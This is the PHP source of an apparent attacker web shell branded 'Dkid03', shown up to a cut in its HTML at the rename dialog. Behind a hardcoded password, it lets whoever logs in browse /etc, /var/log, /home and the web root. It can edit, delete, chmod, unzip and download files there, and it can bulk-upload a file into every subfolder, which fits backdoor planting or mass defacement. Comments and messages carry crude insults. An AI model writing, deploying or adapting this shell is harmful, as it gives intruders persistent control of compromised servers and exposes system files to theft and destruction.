<?php
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 1);

// ==============================================
// KONFIGURASI UTAMA
// AUTHOR: DKID03
//GANTI AUTHOR MANDUL 7 TURUNAN!!!
// ==============================================
$rootPath = realpath(__DIR__);
$loginUsername = 'admin';
$loginPassword = 'Dkid@123';
$animeImageUrl = 'https://h3liqz.com/iqyan/uploads/file_684d648c12b592.32290481.jpg';

// Daftar ekstensi file yang dapat diedit
$editableExtensions = ['txt', 'php', 'html', 'css', 'js', 'json', 'xml', 'md', 'ini', 'log', 'htaccess'];

// Direktori khusus yang dapat diakses
$specialDirectories = [
    'public_html' => realpath($_SERVER['DOCUMENT_ROOT']),
    'user' => realpath('/home'),
    'etc' => realpath('/etc'),
    'log' => realpath('/var/log'),
    'homeshell' => $rootPath
];

// ==============================================
// FUNGSI UTILITAS
// ==============================================
function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    
    $items = @scandir($dir);
    if ($items === false) return false;
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        
        if (is_dir($path)) {
            if (!deleteDirectory($path)) return false;
        } else {
            if (!@unlink($path)) return false;
        }
    }
    
    return @rmdir($dir);
}

function breadcrumb($path, $rootPath, $specialDirs) {
    $breadcrumb = '<a href="?path=">HomeShell</a>';
    
    // Tambahkan direktori khusus
    $breadcrumb .= ' | ';
    foreach ($specialDirs as $name => $dirPath) {
        if ($dirPath && is_dir($dirPath)) {
            $breadcrumb .= '<a href="?path=' . urlencode($dirPath) . '">' . htmlspecialchars($name) . '</a> | ';
        }
    }
    
    $relative = str_replace($rootPath, '', $path);
    $parts = array_filter(explode('/', $relative));
    
    $current = '';
    foreach ($parts as $part) {
        $current .= '/' . $part;
        $breadcrumb .= ' / <a href="?path=' . urlencode($current) . '">' . htmlspecialchars($part) . '</a>';
    }
    
    return $breadcrumb;
}

function isSafePath($path, $rootPath, $specialDirs) {
    // Perbolehkan rootPath
    if (strpos($path, $rootPath) === 0) return true;
    
    // Perbolehkan direktori khusus
    foreach ($specialDirs as $dirPath) {
        if ($dirPath && strpos($path, $dirPath) === 0) return true;
    }
    
    return false;
}

function isValidName($name) {
    return !empty($name) && !preg_match('/[\/\\\\:\*\?"<>\|]/', $name);
}

// ==============================================
// PROSES LOGIN
// ==============================================
if (isset($_GET['logout'])) {
    session_destroy();
    session_start();
    $_SESSION['logout_success'] = true;
    header('Location: ?');
    exit;
}

if (isset($_POST['login'])) {
    try {
        if ($_POST['username'] === $loginUsername && $_POST['password'] === $loginPassword) {
            $_SESSION['loggedin'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ?');
            exit;
        } else {
            throw new Exception('Kasian si ngentot ini mau nikung');
        }
    } catch (Exception $e) {
        $loginError = $e->getMessage();
    }
}

// ==============================================
// PROSES FILE MANAGER (SETELAH LOGIN)
// ==============================================
if (isset($_SESSION['loggedin'])) {
    if (time() - $_SESSION['login_time'] > 1800) {
        session_destroy();
        header('Location: ?');
        exit;
    }
    
    $currentPath = $rootPath;
    if (isset($_GET['path'])) {
        $requestedPath = realpath($_GET['path']);
        if ($requestedPath && isSafePath($requestedPath, $rootPath, $specialDirectories)) {
            $currentPath = $requestedPath;
        } else {
            $error = "Path tidak valid atau di luar direktori yang diizinkan";
        }
    }
    
    if (!file_exists($currentPath) || !is_dir($currentPath) || !is_readable($currentPath)) {
        $error = "Direktori tidak dapat diakses";
        $currentPath = $rootPath;
    }
    
    // Tangani rename sebagai POST request
    if (isset($_POST['rename'])) {
        try {
            $target = $_POST['target'] ?? '';
            $newName = $_POST['new_name'] ?? '';
            
            if (empty($target) || empty($newName)) {
                throw new Exception('Nama baru tidak valid');
            }
            
            if (!isValidName($newName)) {
                throw new Exception('Nama tidak valid');
            }
            
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $newName;
            
            if (!file_exists($targetPath) || !isSafePath($targetPath, $rootPath, $specialDirectories)) {
                throw new Exception('Target tidak valid');
            }
            
            if (!@rename($targetPath, $newPath)) {
                throw new Exception('Gagal mengganti nama');
            }
            
            $success = 'Berhasil mengganti nama menjadi ' . htmlspecialchars($newName);
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // Tangani aksi file lainnya
    if (isset($_GET['action'])) {
        try {
            $action = $_GET['action'];
            $target = $_GET['target'] ?? '';
            
            if (empty($target)) {
                throw new Exception('Target tidak valid');
            }
            
            $targetPath = $currentPath . DIRECTORY_SEPARATOR . $target;
            
            if (!file_exists($targetPath) || !isSafePath($targetPath, $rootPath, $specialDirectories)) {
                throw new Exception('Target tidak valid');
            }
            
            switch ($action) {
                case 'delete':
                    if (is_dir($targetPath)) {
                        if (!deleteDirectory($targetPath)) {
                            throw new Exception('Gagal menghapus direktori');
                        }
                    } else {
                        if (!@unlink($targetPath)) {
                            throw new Exception('Gagal menghapus file');
                        }
                    }
                    $success = 'Berhasil menghapus ' . htmlspecialchars($target);
                    break;
                    
                case 'chmod':
                    if (!isset($_POST['mode']) || empty($_POST['mode']) || !preg_match('/^[0-7]{3,4}$/', $_POST['mode'])) {
                        throw new Exception('Mode permission tidak valid');
                    }
                    $mode = octdec($_POST['mode']);
                    if (!@chmod($targetPath, $mode)) {
                        throw new Exception('Gagal mengubah permission');
                    }
                    $success = 'Berhasil mengubah permission menjadi ' . $_POST['mode'];
                    break;
                    
                case 'unzip':
                    if (!class_exists('ZipArchive')) {
                        throw new Exception('Ekstensi Zip tidak tersedia');
                    }
                    $zip = new ZipArchive;
                    if ($zip->open($targetPath) === TRUE) {
                        $zip->extractTo($currentPath);
                        $zip->close();
                        $success = 'File berhasil diekstrak';
                    } else {
                        throw new Exception('Gagal membuka file zip');
                    }
                    break;
                    
                case 'download':
                    if (is_dir($targetPath)) {
                        throw new Exception('Tidak dapat mendownload direktori');
                    }
                    
                    if (!is_readable($targetPath)) {
                        throw new Exception('File tidak dapat dibaca');
                    }
                    
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($targetPath));
                    readfile($targetPath);
                    exit;
                    
                default:
                    throw new Exception('Aksi tidak dikenali');
            }
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    if (isset($_POST['create'])) {
        try {
            $type = $_POST['type'];
            $name = $_POST['name'] ?? '';
            
            if (empty($name) || !isValidName($name)) {
                throw new Exception('Nama tidak valid');
            }
            
            $newPath = $currentPath . DIRECTORY_SEPARATOR . $name;
            
            if ($type === 'file') {
                if (!@touch($newPath)) {
                    throw new Exception('Gagal membuat file');
                }
                $success = 'File berhasil dibuat: ' . htmlspecialchars($name);
            } elseif ($type === 'folder') {
                if (!@mkdir($newPath)) {
                    throw new Exception('Gagal membuat folder');
                }
                $success = 'Folder berhasil dibuat: ' . htmlspecialchars($name);
            }
            
            header('Location: ?path=' . urlencode($currentPath));
            exit;
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    // ==============================================
    // HANDLE UPLOAD (NORMAL & BULK)
    // ==============================================
    if (isset($_FILES['upload'])) {
        try {
            if (!is_writable($currentPath)) {
                throw new Exception('Direktori tidak dapat ditulisi');
            }
            
            $uploadedFiles = [];
            $bulkMode = isset($_POST['upload_mode']) && $_POST['upload_mode'] === 'bulk';
            $subDirs = [];
            
            // If bulk mode, get all immediate subdirectories
            if ($bulkMode) {
                $items = @scandir($currentPath);
                if ($items !== false) {
                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;
                        $subPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                        if (is_dir($subPath) && is_writable($subPath)) {
                            $subDirs[] = $subPath;
                        }
                    }
                }
            }
            
            foreach ($_FILES['upload']['name'] as $key => $name) {
                $tmpName = $_FILES['upload']['tmp_name'][$key];
                $errorCode = $_FILES['upload']['error'][$key];
                
                if ($errorCode !== UPLOAD_ERR_OK) {
                    throw new Exception('Error upload file: ' . $errorCode);
                }
                
                $safeName = basename($name);
                if (!isValidName($safeName)) {
                    throw new Exception('Nama file tidak valid: ' . $name);
                }
                
                $target = $currentPath . DIRECTORY_SEPARATOR . $safeName;
                
                if (!@move_uploaded_file($tmpName, $target)) {
                    throw new Exception('Gagal mengupload file: ' . $safeName);
                }
                
                $uploadedFiles[] = $safeName;
                
                // If bulk mode, copy the file to each subdirectory
                if ($bulkMode) {
                    foreach ($subDirs as $subDir) {
                        $copyTarget = $subDir . DIRECTORY_SEPARATOR . $safeName;
                        @copy($target, $copyTarget); // Silently fail if copy fails, but we could log
                    }
                }
            }
            
            if ($bulkMode) {
                $success = 'File berhasil diupload ke direktori ini dan ' . count($subDirs) . ' subfolder: ' . implode(', ', $uploadedFiles);
            } else {
                $success = 'File berhasil diupload: ' . implode(', ', $uploadedFiles);
            }
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
    
    if (isset($_POST['save_file'])) {
        try {
            $file = $_POST['file'];
            $content = $_POST['content'];
            
            $filePath = $currentPath . DIRECTORY_SEPARATOR . $file;
            
            if (!file_exists($filePath) || !is_file($filePath) || !isSafePath($filePath, $rootPath, $specialDirectories)) {
                throw new Exception('File tidak valid');
            }
            
            if (!is_writable($filePath)) {
                throw new Exception('File tidak dapat ditulisi');
            }
            
            if (@file_put_contents($filePath, $content) === false) {
                throw new Exception('Gagal menyimpan file');
            }
            
            $success = 'File berhasil disimpan';
            
        } catch (Exception $e) {
            $error = $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dkid03</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-dark: rgba(26, 26, 46, 0.6);
            --bg-darker: rgba(22, 33, 62, 0.7);
            --bg-light: rgba(45, 64, 89, 0.6);
            --accent: #4cc9f0;
            --accent-dark: #4361ee;
            --text: #e6e6e6;
            --text-muted: #b3b3b3;
            --success: #4ade80;
            --warning: #fbbf24;
            --danger: #f87171;
            --border: rgba(42, 58, 82, 0.4);
            --sidebar-width: 280px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }
        
        body {
            color: var(--text);
            min-height: 100vh;
            line-height: 1.6;
            overflow-x: hidden;
            background: #0f172a;
        }
        
        /* Background image for all pages */
        .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('<?= $animeImageUrl ?>') no-repeat center center;
            background-size: cover;
            z-index: -1000;
            filter: brightness(0.7);
        }
        
        /* Tampilan Login */
        .login-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 2rem;
            position: relative;
        }
        
        .login-box {
            background: rgba(26, 26, 46, 0.4);
            border-radius: 16px;
            padding: 2.5rem;
            width: 100%;
            max-width: 400px;
            border: 1px solid rgba(67, 97, 238, 0.3);
            backdrop-filter: blur(5px);
            z-index: 1;
        }
        
        .login-title {
            text-align: center;
            margin-bottom: 1.5rem;
            font-size: 1.8rem;
            color: var(--accent);
            font-weight: 500;
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--text);
        }
        
        .form-control {
            width: 100%;
            padding: 0.75rem 1rem;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: var(--text);
            font-size: 1rem;
            transition: all 0.3s;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--accent);
            background: rgba(255, 255, 255, 0.15);
        }
        
        .btn {
            display: inline-block;
            padding: 0.75rem 1.5rem;
            background: var(--accent-dark);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            text-align: center;
            transition: all 0.3s ease;
            text-decoration: none;
        }
        
        .btn:hover {
            background: var(--accent);
            transform: translateY(-2px);
        }
        
        .btn-block {
            display: block;
            width: 100%;
        }
        
        .alert {
            padding: 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            position: relative;
        }
        
        .alert-danger {
            background: rgba(248, 113, 113, 0.15);
            border: 1px solid var(--danger);
            color: var(--danger);
        }
        
        .alert-success {
            background: rgba(74, 222, 128, 0.15);
            border: 1px solid var(--success);
            color: var(--success);
        }
        
        .close-btn {
            position: absolute;
            top: 0.5rem;
            right: 0.75rem;
            background: none;
            border: none;
            color: inherit;
            font-size: 1.25rem;
            cursor: pointer;
        }
        
        /* Tampilan File Manager */
        .app-container {
            display: flex;
            min-height: 100vh;
        }
        
        /* Sidebar - Diperbarui */
        .sidebar {
            width: var(--sidebar-width);
            background: rgba(26, 26, 46, 0.5);
            height: 100vh;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 100;
            overflow-y: auto;
            backdrop-filter: blur(5px);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
        }
        
        .sidebar-header {
            padding: 1.5rem 1.5rem 1rem;
            border-bottom: 1px solid var(--border);
        }
        
        .sidebar-title {
            font-size: 1.25rem;
            color: var(--accent);
            font-weight: 500;
            margin-bottom: 0.5rem;
        }
        
        .sidebar-subtitle {
            color: var(--text-muted);
            font-size: 0.9rem;
        }
        
        .sidebar-menu {
            padding: 1.5rem;
            flex-grow: 1;
        }
        
        .menu-section {
            margin-bottom: 1.5rem;
        }
        
        .menu-title {
            color: var(--accent);
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 0.75rem;
            padding-left: 0.5rem;
        }
        
        .menu-item {
            display: flex;
            align-items: center;
            padding: 0.75rem 1rem;
            border-radius: 8px;
            color: var(--text);
            text-decoration: none;
            margin-bottom: 0.5rem;
            transition: all 0.2s;
            cursor: pointer;
            background: rgba(45, 64, 89, 0.3);
        }
        
        .menu-item:hover {
            background: rgba(67, 97, 238, 0.4);
            color: white;
        }
        
        .menu-item i {
            margin-right: 0.75rem;
            font-size: 1.1rem;
            width: 24px;
            text-align: center;
        }
        
        .logout-btn {
            background: rgba(248, 113, 113, 0.2);
            color: var(--danger);
            margin-top: auto;
        }
        
        .logout-btn:hover {
            background: rgba(248, 113, 113, 0.3);
        }
        
        /* Main Content */
        .main-content {
            flex: 1;
            margin-left: var(--sidebar-width);
            padding: 1.5rem;
            position: relative;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.5rem 0;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
            gap: 1rem;
        }
        
        .title {
            font-size: 1.5rem;
            color: var(--accent);
            font-weight: 500;
        }
        
        .breadcrumb {
            background: var(--bg-light);
            padding: 0.75rem 1rem;
            border-radius: 8px;
            margin-bottom: 1.5rem;
            font-size: 0.9rem;
            overflow-x: auto;
            white-space: nowrap;
            backdrop-filter: blur(5px);
        }
        
        .breadcrumb a {
            color: var(--accent);
            text-decoration: none;
        }
        
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        
        .card {
            background: var(--bg-dark);
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 1.5rem;
            border: 1px solid var(--border);
            backdrop-filter: blur(5px);
        }
        
        .card-header {
            padding: 1rem 1.5rem;
            background: var(--bg-light);
            border-bottom: 1px solid var(--border);
            font-weight: 500;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .card-body {
            padding: 1.5rem;
            max-height: 60vh;
            overflow-y: auto;
        }
        
        .table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .table th,
        .table td {
            padding: 0.75rem 1rem;
            text-align: left;
            border-bottom: 1px solid var(--border);
        }
        
        .table th {
            background: var(--bg-light);
            font-weight: 500;
            position: sticky;
            top: 0;
        }
        
        .table tr:hover {
            background: rgba(69, 123, 157, 0.1);
        }
        
        .folder {
            color: var(--accent);
        }
        
        .file {
            color: var(--text);
        }
        
        .action-links {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
        }
        
        .action-links a {
            color: var(--text-muted);
            text-decoration: none;
            font-size: 0.85rem;
            padding: 0.25rem 0.5rem;
            border-radius: 4px;
            transition: all 0.2s;
            background: rgba(45, 64, 89, 0.3);
        }
        
        .action-links a:hover {
            color: var(--accent);
            background: rgba(76, 201, 240, 0.2);
        }
        
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            backdrop-filter: blur(5px);
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }
        
        .modal.active {
            opacity: 1;
            visibility: visible;
        }
        
        .modal-content {
            background: var(--bg-darker);
            border-radius: 12px;
            width: 90%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            border: 1px solid var(--border);
            transform: translateY(20px);
            transition: transform 0.3s;
            backdrop-filter: blur(10px);
        }
        
        .modal.active .modal-content {
            transform: translateY(0);
        }
        
        .modal-header {
            padding: 1.5rem;
            border-bottom: 1px solid var(--border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-title {
            font-size: 1.25rem;
            color: var(--accent);
            font-weight: 500;
        }
        
        .modal-close {
            background: none;
            border: none;
            color: var(--text-muted);
            font-size: 1.5rem;
            cursor: pointer;
            transition: color 0.2s;
        }
        
        .modal-close:hover {
            color: var(--accent);
        }
        
        .modal-body {
            padding: 1.5rem;
        }
        
        .text-editor {
            width: 100%;
            min-height: 300px;
            background: rgba(45, 64, 89, 0.5);
            color: var(--text);
            border: 1px solid var(--border);
            border-radius: 8px;
            padding: 1rem;
            font-family: monospace;
            resize: vertical;
        }
        
        /* Radio group styling */
        .radio-group {
            margin: 1rem 0;
        }
        .radio-group label {
            display: inline-block;
            margin-right: 1.5rem;
            cursor: pointer;
        }
        .radio-group input[type="radio"] {
            margin-right: 0.3rem;
            vertical-align: middle;
        }
        
        /* Responsif */
        @media (max-width: 992px) {
            .sidebar {
                transform: translateX(-100%);
                width: 280px;
            }
            
            .sidebar.active {
                transform: translateX(0);
            }
            
            .main-content {
                margin-left: 0;
            }
            
            .menu-toggle {
                display: block;
            }
        }
        
        /* Toggle menu untuk mobile */
        .menu-toggle {
            position: fixed;
            top: 1rem;
            left: 1rem;
            background: var(--accent-dark);
            color: white;
            border: none;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            z-index: 101;
            display: none;
        }
        
        @media (max-width: 992px) {
            .menu-toggle {
                display: flex;
            }
        }
        
        /* Animasi */
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .animate-in {
            animation: fadeIn 0.3s ease-out;
        }
        
        /* Scrollbar styling */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: rgba(45, 64, 89, 0.3);
        }
        
        ::-webkit-scrollbar-thumb {
            background: var(--accent-dark);
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent);
        }
        
        .file-icon {
            margin-right: 8px;
            font-size: 1.2em;
        }
    </style>
</head>
<body>
    <!-- Background image for all pages -->
    <div class="background-image"></div>
    
    <?php if (!isset($_SESSION['loggedin'])): ?>
        <!-- Halaman Login -->
        <div class="login-container">
            <div class="login-box animate-in">
                <h1 class="login-title">Dkid03</h1>
                
                <?php if (isset($loginError)): ?>
                    <div class="alert alert-danger">
                        <?= htmlspecialchars($loginError) ?>
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                <?php endif; ?>
                
                <?php if (isset($_SESSION['logout_success'])): ?>
                    <div class="alert alert-success">
                        Anda berhasil logout
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                    <?php unset($_SESSION['logout_success']); ?>
                <?php endif; ?>
                
                <form method="post">
                    <div class="form-group">
                        <label for="username">Username</label>
                        <input type="text" id="username" name="username" class="form-control" required autocomplete="off">
                    </div>
                    
                    <div class="form-group">
                        <label for="password">Password</label>
                        <input type="password" id="password" name="password" class="form-control" required>
                    </div>
                    
                    <button type="submit" name="login" class="btn btn-block">Login</button>
                </form>
            </div>
        </div>
        
    <?php else: ?>
        <!-- Halaman File Manager -->
        <div class="app-container">
            <!-- Sidebar - Diperbarui -->
            <div class="sidebar">
                <div class="sidebar-header">
                    <h2 class="sidebar-title">Dkid03 Access</h2>
                    <p class="sidebar-subtitle"><?= htmlspecialchars($currentPath) ?></p>
                </div>
                
                <div class="sidebar-menu">
                    <div class="menu-section">
                        <h3 class="menu-title">Operasi File</h3>
                        <div class="menu-item" onclick="showModal('uploadModal')">
                            <i class="fas fa-upload"></i> Upload File
                        </div>
                        <div class="menu-item" onclick="showModal('createModal')">
                            <i class="fas fa-file"></i> Buat File Baru
                        </div>
                        <div class="menu-item" onclick="showModal('createFolderModal')">
                            <i class="fas fa-folder"></i> Buat Folder Baru
                        </div>
                    </div>
                    
                    <div class="menu-section">
                        <h3 class="menu-title">System</h3>
                        <a href="?logout" class="menu-item logout-btn">
                            <i class="fas fa-sign-out-alt"></i> Logout
                        </a>
                    </div>
                </div>
            </div>
            
            <!-- Toggle Button untuk Mobile -->
            <button class="menu-toggle" onclick="toggleSidebar()">
                <i class="fas fa-bars"></i>
            </button>
            
            <!-- Main Content -->
            <div class="main-content">
                <div class="header">
                    <center><h1 class="title">Love Dkid03</h1>
                </div>
                
                <?php if (isset($error)): ?>
                    <div class="alert alert-danger">
                        <?= htmlspecialchars($error) ?>
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                <?php endif; ?>
                
                <?php if (isset($success)): ?>
                    <div class="alert alert-success">
                        <?= htmlspecialchars($success) ?>
                        <button class="close-btn" onclick="this.parentElement.style.display='none'">&times;</button>
                    </div>
                <?php endif; ?>
                
                <div class="breadcrumb">
                    <?= breadcrumb($currentPath, $rootPath, $specialDirectories) ?>
                </div>
                
                <div class="card animate-in">
                    <div class="card-header">
                        <span>Daftar File & Folder</span>
                        <span><?= count(scandir($currentPath)) - 2 ?> item</span>
                    </div>
                    <div class="card-body">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>Nama</th>
                                    <th>Tipe</th>
                                    <th>Ukuran</th>
                                    <th>Permisi</th>
                                    <th>Aksi</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if ($currentPath !== $rootPath || !empty($specialDirectories)): ?>
                                    <tr>
                                        <td>
                                            <a href="?path=<?= urlencode(dirname($currentPath)) ?>">
                                                <i class="file-icon fas fa-folder"></i>
                                                <span class="folder">..</span>
                                            </a>
                                        </td>
                                        <td>Folder</td>
                                        <td>-</td>
                                        <td>-</td>
                                        <td class="action-links">-</td>
                                    </tr>
                                <?php endif; ?>
                                
                                <?php
                                $items = @scandir($currentPath);
                                if ($items === false) $items = [];
                                
                                foreach ($items as $item) {
                                    if ($item === '.' || $item === '..') continue;
                                    
                                    $itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
                                    $isDir = is_dir($itemPath);
                                    $size = $isDir ? '-' : @filesize($itemPath);
                                    $sizeFormatted = $isDir ? '-' : ($size !== false ? formatSize($size) : 'Error');
                                    $perms = @fileperms($itemPath);
                                    $permsFormatted = $perms ? substr(sprintf('%o', $perms), -4) : 'Error';
                                    ?>
                                    <tr>
                                        <td>
                                            <?php if ($isDir): ?>
                                                <a href="?path=<?= urlencode($itemPath) ?>" class="folder">
                                                    <i class="file-icon fas fa-folder"></i>
                                                    <span><?= htmlspecialchars($item) ?></span>
                                                </a>
                                            <?php else: ?>
                                                <span class="file">
                                                    <?php
                                                    $icon = 'fa-file';
                                                    $ext = pathinfo($item, PATHINFO_EXTENSION);
                                                    if (in_array(strtolower($ext), ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'svg'])) $icon = 'fa-file-image';
                                                    if (in_array(strtolower($ext), ['zip', 'rar', 'tar', 'gz', '7z'])) $icon = 'fa-file-archive';
                                                    if (in_array(strtolower($ext), ['php', 'js', 'html', 'css', 'scss', 'less'])) $icon = 'fa-file-code';
                                                    if (in_array(strtolower($ext), ['mp3', 'wav', 'ogg'])) $icon = 'fa-file-audio';
                                                    if (in_array(strtolower($ext), ['mp4', 'avi', 'mov', 'mkv'])) $icon = 'fa-file-video';
                                                    if (in_array(strtolower($ext), ['pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx'])) $icon = 'fa-file-pdf';
                                                    ?>
                                                    <i class="file-icon fas <?= $icon ?>"></i>
                                                    <span><?= htmlspecialchars($item) ?></span>
                                                </span>
                                            <?php endif; ?>
                                        </td>
                                        <td><?= $isDir ? 'Folder' : 'File' ?></td>
                                        <td><?= $sizeFormatted ?></td>
                                        <td><?= $permsFormatted ?></td>
                                        <td class="action-links">
                                            <?php if (!$isDir && in_array(strtolower(pathinfo($item, PATHINFO_EXTENSION)), $editableExtensions)): ?>
                                                <a href="#" onclick="editFile('<?= htmlspecialchars($item) ?>')">Edit</a>
                                            <?php endif; ?>
                                            
                                            <a href="#" onclick="showRename('<?= htmlspecialchars($item) ?>')">Rename</a>
                                            
                                            <a href="?path=<?= urlencode($currentPath) ?>&action=download&target=<?= urlencode($item) ?>">Download</a>
                                            
                                            <a href="?path=<?= urlencode($currentPath) ?>&action=delete&target=<?= urlencode($item) ?>" 
                                               onclick="return confirm('Yakin ingin menghapus <?= htmlspecialchars($item) ?>?')"
                                               style="color: var(--danger);">
                                                Hapus
                                            </a>
                                            
                                            <?php if (!$isDir && strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'): ?>
                                                <a href="?path=<?= urlencode($currentPath) ?>&action=unzip&target=<?= urlencode($item) ?>">Unzip</a>
                                            <?php endif; ?>
                                            
                                            <a href="#" onclick="showChmod('<?= htmlspecialchars($item) ?>', '<?= $permsFormatted ?>')">CHMOD</a>
                                        </td>
                                    </tr>
                                <?php } ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Modal untuk Membuat File -->
        <div id="createModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Buat File Baru</h2>
                    <button class="modal-close" onclick="hideModal('createModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="filename">Nama File</label>
                            <input type="text" id="filename" name="name" class="form-control" required>
                            <small class="text-muted">Contoh: index.php, script.js</small>
                        </div>
                        <input type="hidden" name="type" value="file">
                        <input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">Buat</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modal untuk Membuat Folder -->
        <div id="createFolderModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Buat Folder Baru</h2>
                    <button class="modal-close" onclick="hideModal('createFolderModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <label for="foldername">Nama Folder</label>
                            <input type="text" id="foldername" name="name" class="form-control" required>
                            <small class="text-muted">Contoh: images, documents</small>
                        </div>
                        <input type="hidden" name="type" value="folder">
                        <input type="hidden" name="create" value="1">
                        <button type="submit" class="btn btn-block">Buat</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modal untuk Upload File (Ditingkatkan dengan pilihan Bulk) -->
        <div id="uploadModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Upload File</h2>
                    <button class="modal-close" onclick="hideModal('uploadModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post" enctype="multipart/form-data">
                        <div class="form-group">
                            <label for="fileUpload">Pilih File (bisa banyak)</label>
                            <input type="file" id="fileUpload" name="upload[]" class="form-control" multiple required>
                            <small class="text-muted">Ukuran maks: <?= ini_get('upload_max_filesize') ?></small>
                        </div>
                        
                        <!-- Pilihan mode upload -->
                        <div class="radio-group">
                            <label>
                                <input type="radio" name="upload_mode" value="normal" checked> Normal (hanya ke folder ini)
                            </label>
                            <label>
                                <input type="radio" name="upload_mode" value="bulk"> Bulk (ke semua subfolder)
                            </label>
                        </div>
                        
                        <button type="submit" class="btn btn-block">Upload</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modal untuk Edit File -->
        <div id="editModal" class="modal">
            <div class="modal-content">
                <div class="modal-header">
                    <h2 class="modal-title">Edit File</h2>
                    <button class="modal-close" onclick="hideModal('editModal')">&times;</button>
                </div>
                <div class="modal-body">
                    <form method="post">
                        <div class="form-group">
                            <textarea id="fileContent" name="content" class="text-editor"></textarea>
                        </div>
                        <input type="hidden" id="editFileName" name="file">
                        <input type="hidden" name="save_file" value="1">
                        <button type="submit" class="btn btn-block">Simpan</button>
                    </form>
                </div>
            </div>
        </div>
        
        <!-- Modal untuk Rename - Diperbaiki -->
